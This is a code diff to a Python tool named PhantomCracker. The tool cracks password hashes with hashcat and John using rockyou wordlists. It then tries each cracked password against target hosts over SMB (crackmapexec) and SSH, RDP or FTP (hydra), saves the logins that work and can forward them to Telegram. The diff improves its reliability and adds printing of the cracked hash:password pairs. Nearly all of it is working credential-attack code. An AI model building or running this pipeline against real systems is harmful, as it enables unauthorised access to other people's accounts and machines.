@@ -25,7 +25,32 @@ HOME.mkdir(exist_ok=True)
 
 DB_PATH = HOME / "phantom.db"
 POTFILE = HOME / "phantom.pot"
-WORDLIST = "/usr/share/wordlists/rockyou.txt"
+
+# Auto-detect wordlist location
+WORDLIST_CANDIDATES = [
+    "/usr/share/wordlists/rockyou.txt",
+    "/usr/share/wordlists/rockyou.txt.gz",
+    os.path.expanduser("~/rockyou.txt"),
+    "./rockyou.txt",
+    "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
+    "/usr/share/seclists/Passwords/Common-Credentials/rockyou.txt",
+]
+
+WORDLIST = None
+for w in WORDLIST_CANDIDATES:
+    if os.path.exists(w):
+        WORDLIST = w
+        break
+
+if WORDLIST and WORDLIST.endswith(".gz"):
+    import gzip
+    try:
+        with gzip.open(WORDLIST, 'rt', encoding='latin-1') as f:
+            pass
+        WORDLIST = WORDLIST  # hashcat can read .gz directly
+    except:
+        pass
+
 RULES = "/usr/share/hashcat/rules/best64.rule"
 TELEGRAM_TOKEN = ""  # Optional: set for real-time alerts
 TELEGRAM_CHAT_ID = ""
@@ -121,27 +146,21 @@ def detect_hash_type(hash_file):
         return 18200, "Kerberos AS-REP"
     
     # Fallback: use John to detect
-    result = subprocess.run(
-        ["john", "--list=formats"],
-        capture_output=True, text=True, timeout=10
-    )
-    
-    # Try John's auto-detect
-    result = subprocess.run(
-        ["john", hash_file, "--wordlist=" + WORDLIST, "--max-run-time=5"],
-        capture_output=True, text=True, timeout=30
-    )
-    
-    for line in result.stdout.split('\n'):
-        if 'Loaded' in line and 'hash' in line:
-            print(f"[+] John detected: {line.strip()}")
-            # Try common formats
-            for fname, fmode in [("nt", 1000), ("raw-md5", 0), ("raw-sha1", 100), 
-                                  ("raw-sha256", 1400), ("sha512crypt", 1800),
-                                  ("bcrypt", 3200), ("md5crypt", 500)]:
-                if fname in line.lower():
-                    return fmode, line.strip()
-            break
+    try:
+        result = subprocess.run(
+            ["john", hash_file, "--wordlist=" + (WORDLIST or "/dev/null"), "--max-run-time=3"],
+            capture_output=True, text=True, timeout=15
+        )
+        for line in result.stdout.split('\n'):
+            if 'Loaded' in line and 'hash' in line:
+                print(f"[+] John detected: {line.strip()}")
+                for fname, fmode in [("nt", 1000), ("raw-md5", 0), ("raw-sha1", 100), 
+                                      ("raw-sha256", 1400), ("sha512crypt", 1800),
+                                      ("bcrypt", 3200), ("md5crypt", 500)]:
+                    if fname in line.lower():
+                        return fmode, line.strip()
+    except:
+        pass
     
     print("[!] Could not auto-detect. Enter hashcat mode number:")
     mode = input("  hashcat -m ")
@@ -153,6 +172,12 @@ def detect_hash_type(hash_file):
 
 def crack_with_hashcat(hash_file, hash_mode, attack_type="dictionary"):
     """Run hashcat with progressively harder attacks."""
+    
+    if not WORDLIST:
+        print("[!] No wordlist found. Install rockyou or specify one.")
+        print("    sudo apt install wordlist")
+        print("    sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
+        return []
     
     cmd = [
         "hashcat",
@@ -168,8 +193,11 @@ def crack_with_hashcat(hash_file, hash_mode, attack_type="dictionary"):
     
     if attack_type == "dictionary":
         cmd.append(WORDLIST)
-        cmd.extend(["-r", RULES])
+        if os.path.exists(RULES):
+            cmd.extend(["-r", RULES])
         print(f"\n[*] Starting dictionary + rules attack (hashcat -m {hash_mode})")
+        print(f"[*] Wordlist: {WORDLIST}")
+        print(f"[*] Rules: {RULES if os.path.exists(RULES) else 'none'}")
     elif attack_type == "mask":
         cmd.append("?l?l?l?l?l?l?l?d?d")  # 8 lowercase + 2 digits
         print(f"\n[*] Starting mask attack (8 lowercase + 2 digits)")
@@ -184,21 +212,21 @@ def crack_with_hashcat(hash_file, hash_mode, attack_type="dictionary"):
         universal_newlines=True
     )
     
-    cracked_count = 0
     for line in process.stdout:
         line = line.strip()
         if 'Cracked' in line:
             try:
                 count = int([x for x in line.split() if x.isdigit()][0])
-                if count > cracked_count:
-                    cracked_count = count
-                    print(f"  [+] Cracked so far: {count}")
+                print(f"  [+] Cracked so far: {count}")
             except:
                 pass
         if 'Speed' in line and 'H/s' in line:
-            print(f"  [Speed] {line.strip()}")
+            speed = line.strip()
+            print(f"  [Speed] {speed}")
         if 'Progress' in line:
             print(f"  [Progress] {line.strip()}")
+        if 'Session' in line and 'stopped' in line.lower():
+            print(f"  [Status] {line.strip()}")
     
     process.wait()
     
@@ -216,6 +244,8 @@ def crack_with_hashcat(hash_file, hash_mode, attack_type="dictionary"):
                 hash_val, password = parts
                 cracked.append((hash_val, password))
                 save_cracked(hash_val, password, attack_type)
+                print(f"  [CRACKED] {hash_val}:{password}")
+                send_alert(f"CRACKED: {hash_val}:{password}")
     
     return cracked
 
@@ -227,16 +257,21 @@ def validate_with_cme(target, username, password):
     """Test a single credential against SMB."""
     print(f"  [*] Testing {username}:{password} against {target} (SMB)...")
     
-    result = subprocess.run(
-        ["crackmapexec", "smb", target, "-u", username, "-p", password],
-        capture_output=True, text=True, timeout=30
-    )
-    
-    if '[+]' in result.stdout:
-        print(f"    [SUCCESS] {username}:{password} works on {target}")
-        save_validated(username, password, target, "SMB")
-        send_alert(f"VALIDATED: {username}:{password} on {target} (SMB)")
-        return True
+    try:
+        result = subprocess.run(
+            ["crackmapexec", "smb", target, "-u", username, "-p", password],
+            capture_output=True, text=True, timeout=30
+        )
+        
+        if '[+]' in result.stdout:
+            print(f"    [SUCCESS] {username}:{password} works on {target}")
+            save_validated(username, password, target, "SMB")
+            send_alert(f"VALIDATED: {username}:{password} on {target} (SMB)")
+            return True
+        else:
+            print(f"    [-] Failed on {target}")
+    except Exception as e:
+        print(f"    [!] Error: {e}")
     
     return False
 
@@ -244,17 +279,22 @@ def validate_with_hydra(target, username, password, service="ssh"):
     """Test a single credential against SSH/RDP/FTP."""
     print(f"  [*] Testing {username}:{password} against {target} ({service})...")
     
-    result = subprocess.run(
-        ["hydra", "-l", username, "-p", password, "-t", "1", "-w", "3",
-         f"{service}://{target}"],
-        capture_output=True, text=True, timeout=30
-    )
-    
-    if '[+]' in result.stdout or 'success' in result.stdout.lower():
-        print(f"    [SUCCESS] {username}:{password} works on {target} ({service})")
-        save_validated(username, password, target, service.upper())
-        send_alert(f"VALIDATED: {username}:{password} on {target} ({service.upper()})")
-        return True
+    try:
+        result = subprocess.run(
+            ["hydra", "-l", username, "-p", password, "-t", "1", "-w", "3",
+             f"{service}://{target}"],
+            capture_output=True, text=True, timeout=30
+        )
+        
+        if '[+]' in result.stdout or 'success' in result.stdout.lower():
+            print(f"    [SUCCESS] {username}:{password} works on {target} ({service})")
+            save_validated(username, password, target, service.upper())
+            send_alert(f"VALIDATED: {username}:{password} on {target} ({service.upper()})")
+            return True
+        else:
+            print(f"    [-] Failed on {target}")
+    except Exception as e:
+        print(f"    [!] Error: {e}")
     
     return False
 
@@ -265,11 +305,27 @@ def validate_with_hydra(target, username, password, service="ssh"):
 def run_full_engagement(hash_file, target_ip=None, services=None):
     """Complete workflow: detect → crack → validate."""
     
+    if not os.path.exists(hash_file):
+        print(f"[!] File not found: {hash_file}")
+        print("[*] Create a test hash file:")
+        print('    echo "8846F7EAEE8FB117AD06BDD830B7586C" > hashes.txt')
+        return
+    
     # Step 1: Init
     init_db()
     print("=" * 60)
     print("  PhantomCracker v1.0 — Full Engagement")
     print("=" * 60)
+    print(f"  Hash file: {hash_file}")
+    print(f"  Wordlist: {WORDLIST or 'NOT FOUND'}")
+    print(f"  Database: {DB_PATH}")
+    print("=" * 60)
+    
+    if not WORDLIST:
+        print("\n[!] No wordlist found! Install one:")
+        print("    sudo apt install wordlist -y")
+        print("    sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
+        return
     
     # Step 2: Detect hash type
     hash_mode, hash_name = detect_hash_type(hash_file)
@@ -307,7 +363,7 @@ def run_full_engagement(hash_file, target_ip=None, services=None):
                 for line in f:
                     if hash_val in line and ':' in line:
                         parts = line.split(':')
-                        if parts[0] != hash_val and len(parts[0]) > 0:
+                        if parts[0] != hash_val and len(parts[0]) > 0 and len(parts[0]) < 50:
                             username = parts[0]
                         break
             
@@ -327,12 +383,12 @@ def run_full_engagement(hash_file, target_ip=None, services=None):
     c = conn.cursor()
     c.execute("SELECT COUNT(*) FROM validated")
     validated_count = c.fetchone()[0]
-    c.execute("SELECT * FROM validated")
+    c.execute("SELECT username, password, target, service FROM validated")
     for row in c.fetchall():
         print(f"  [+] {row[0]}:{row[1]} -> {row[2]} ({row[3]})")
     conn.close()
     
-    print(f"\n  Validated credentials: {validated_count}")
+    print(f"  Validated credentials: {validated_count}")
     print(f"\n  Database: {DB_PATH}")
     print(f"  Potfile: {POTFILE}")
 
@@ -352,13 +408,12 @@ def main():
     
     args = parser.parse_args()
     
-    if not os.path.exists(args.hash_file):
-        print(f"[!] File not found: {args.hash_file}")
-        sys.exit(1)
-    
+    # If mode is provided, use it directly
     if args.mode and args.no_validate:
-        # Quick crack with known mode
         init_db()
+        if not os.path.exists(args.hash_file):
+            print(f"[!] File not found: {args.hash_file}")
+            sys.exit(1)
         print(f"[*] Cracking mode {args.mode} with dictionary + rules...")
         cracked = crack_with_hashcat(args.hash_file, args.mode, "dictionary")
         
@@ -371,8 +426,10 @@ def main():
             print(f"  {h}: {p}")
         
     elif args.mode and args.target:
-        # Full: crack then validate
         init_db()
+        if not os.path.exists(args.hash_file):
+            print(f"[!] File not found: {args.hash_file}")
+            sys.exit(1)
         print(f"[*] Cracking mode {args.mode} + validating against {args.target}...")
         cracked = crack_with_hashcat(args.hash_file, args.mode, "dictionary")
         
